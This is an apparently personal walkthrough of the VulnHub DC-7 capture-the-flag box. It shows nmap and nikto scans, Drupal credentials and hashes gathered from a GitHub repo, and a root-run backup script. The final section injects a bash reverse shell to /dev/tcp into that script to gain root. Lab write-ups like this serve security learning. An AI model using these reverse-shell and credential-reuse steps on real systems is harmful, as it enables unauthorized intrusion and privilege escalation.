# BOX NAME: DC-7
**LINK**: https://www.vulnhub.com/entry/dc-7,356/

<details open><summary><ins>SUMMARY</ins></summary>

```
1. Enumerate box. Look outside the box for credentials.
2. Locate the backups script.
3. change password on drupal database (drush)
4. get a reverse shell as www-data, so you can manipulate the backups script.
5. wait 15minutes to ge a callback.

Great box! Fun to loot for creds outside the box. Cool to get into the box and THEN get into the www-data user with a reverse shell. Opposite order! 
```
</details>

# REMOTE ENUMERATION:

<details><summary><ins>TARGET</ins></summary>

```
[+] IP:		10.77.0.71
[+] URL:	http://dc-7
```
</details>
<details><summary><ins>NMAP</ins></summary>

```
└─$ nmap -sV -sC $IP -oN nmap-dc7.log
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-03 20:29 CEST
Nmap scan report for dc.local (10.77.0.71)
Host is up (0.00019s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey:                                                                                                      
|   2048 d002e9c75d9532ab10998984343d1ef9 (RSA)                                                                     
|   256 d0d64035a734a90a7934eea96addf48f (ECDSA)
|_  256 a855d57693ed4f6ff1f7a1842fafbbe1 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Welcome to DC-7 | D7
|_http-generator: Drupal 8 (https://www.drupal.org)
| http-robots.txt: 22 disallowed entries (15 shown)
| /core/ /profiles/ /README.txt /web.config /admin/ 
| /comment/reply/ /filter/tips /node/add/ /search/ /user/register/ 
| /user/password/ /user/login/ /user/logout/ /index.php/admin/ 
|_/index.php/comment/reply/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.36 seconds

```
</details>
<details><summary><ins>WEB</ins></summary>

whatweb-scan
```
└─$ whatweb $URL --log-verbose=whatweb-dc7.log
http://dc-7/ [200 OK] Apache[2.4.25], Content-Language[en], Country[RESERVED][ZZ], Drupal, HTML5, HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[10.77.0.71], MetaGenerator[Drupal 8 (https://www.drupal.org)], PoweredBy[-block], Script, Title[Welcome to DC-7 | D7], UncommonHeaders[x-drupal-dynamic-cache,link,x-content-type-options,x-generator,x-drupal-cache], X-Frame-Options[SAMEORIGIN], X-UA-Compatible[IE=edge]

```

nikto-scan
```
└─$ nikto -h $URL | tee nikto-dc7.log
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.77.0.71
+ Target Hostname:    dc-7
+ Target Port:        80
+ Start Time:         2023-05-03 20:29:24 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.4.25 (Debian)
+ /: Drupal 8 was identified via the x-generator header. See: https://www.drupal.org/project/remove_http_headers
+ /: Drupal Link header found with value: ARRAY(0x55e0ec091888). See: https://www.drupal.org/
+ /: Uncommon header 'x-drupal-dynamic-cache' found, with contents: MISS.
+ /Eavm0SOQ.sh: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulne
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /robots.txt: Entry '/index.php/user/login/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/filter/tips/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/index.php/filter/tips' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/user/login/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/README.txt' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/user/password/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/index.php/user/password/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: contains 40 entries which should be manually viewed. See: https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt
+ Apache/2.4.25 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ OPTIONS: Allowed HTTP Methods: GET, POST .
+ /web.config: ASP config file is accessible.
+ /INSTALL.txt: Default file found.
+ /LICENSE.txt: License file found may identify site software.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /core/CHANGELOG.txt: Drupal version number revealed in CHANGELOG.txt.
+ 7893 requests: 0 error(s) and 19 item(s) reported on remote host
+ End Time:           2023-05-03 20:33:42 (GMT2) (258 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

fuzzing
```
got zilch. 
@dc7user. "outside" box.
Turns out there is a repository on github with database credentials for a DC-7 challenge.
ssh login possible with same creds.
```
other
```

```

</details>

<details><summary><ins>SERVICES</ins></summary>

FTP
```

```

SSH
```

```

SNMP
```

```

DNS
```

```

MAILSERVICES (POP, IMAP, SMTP)
```

```

LDAP
```

```

</details>

<details><summary><ins>Active Directory</ins></summary>

Active Directory
```

```
</details>

<details><summary><ins>SUMMARY REMOTE</ins></summary>

```
1.
2.
3.
```
</details>

# LOCAL ENUMERATION:

<details><summary><ins>FILES OF INTEREST</ins></summary>

**FILES**:
```
/home/dc7user/mbox
/home/dc7user/backups/website.sql.gpg

/opt/scripts/backups.sh
#!/bin/bash
rm /home/dc7user/backups/*
cd /var/www/html/
drush sql-dump --result-file=/home/dc7user/backups/website.sql
cd ..
tar -czf /home/dc7user/backups/website.tar.gz html/
gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql
gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz
chown dc7user:dc7user /home/dc7user/backups/*
rm /home/dc7user/backups/website.sql
rm /home/dc7user/backups/website.tar.gz

```

**SUID's**:

```
/bin/su
/bin/ping
/bin/umount
/bin/mount
/usr/sbin/exim4
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/newgrp
```
**SGID's**:

```
/sbin/unix_chkpwd                                                                                       
/usr/bin/expiry                                                                                         
/usr/bin/ssh-agent                                                                                      
/usr/bin/crontab                                                                                        
/usr/bin/dotlockfile                                                                                    
/usr/bin/dotlock.mailutils                                                                              
/usr/bin/bsd-write                                                                                      
/usr/bin/chage                                                                                          
/usr/bin/wall  
```
**OTHERS**:

```

```
</details>


# LOOT

<details><summary><ins>USEFUL INFORMATION:</ins></summary>

**Kernel Info:**
*file /bin/bash ; echo -e " \\n" && lsb_release -a ; echo -e "\\n" && uname -a*
```
/bin/bash: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=4be0cc32aba02ec4e0f010047be5ae9dee756960, stripped
 

No LSB modules are available.
Distributor ID: Debian
Description:    Debian GNU/Linux 9.9 (stretch)
Release:        9.9
Codename:       stretch


Linux dc-7 4.9.0-9-amd64 #1 SMP Debian 4.9.168-1+deb9u5 (2019-08-11) x86_64 GNU/Linux
```
</details>

<details><summary><ins>CREDS:</ins></summary>

```
username:password
dc7user:MdR3xOgB7#dW 	[ssh]
dc7user:MdR3xOgB7#dW 	[mySQL]

https://github.com/Dc7User/staffdb/blob/master/config.php
<?php
	$servername = "localhost";
	$username = "dc7user";
	$password = "MdR3xOgB7#dW";
	$dbname = "Staff";
	$conn = mysqli_connect($servername, $username, $password, $dbname);
?>
```
</details>

<details><summary><ins>HASHES:</ins></summary>

```
admin:$S$Ead.KmIcT/yfKC.1H53aDPJasaD7o.ioEGiaPy1lLyXXAJC/Qi4F
dc7user:$S$EKe0kuKQvFhgFnEYMpq.mRtbl/TQ5FmEjCDxbu0HIHaO0/U.YFjI
```
</details>

# PROOFS

<details><summary><ins>Proofs</ins></summary>

Final payload:
```
echo "bash -c 'bash -i &> /dev/tcp/$IP/$PORT 0>&1'" >> /opt/scripts/backups.sh
wait 15 minutes.
```
```
root@dc-7:~# ^[[A
cat theflag.txt




888       888          888 888      8888888b.                             888 888 888 888 
888   o   888          888 888      888  "Y88b                            888 888 888 888 
888  d8b  888          888 888      888    888                            888 888 888 888 
888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 
888d88888b888 d8P  Y8b 888 888      888    888 d88""88b 888 "88b d8P  Y8b 888 888 888 888 
88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P 
8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      "   "   "   "  
888P     Y888  "Y8888  888 888      8888888P"   "Y88P"  888  888  "Y8888  888 888 888 888 


Congratulations!!!

Hope you enjoyed DC-7.  Just wanted to send a big thanks out there to all those
who have provided feedback, and all those who have taken the time to complete these little
challenges.

I'm sending out an especially big thanks to:

@4nqr34z
@D4mianWayne
@0xmzfr
@theart42

If you enjoyed this CTF, send me a tweet via @DCAU7.

```

</details>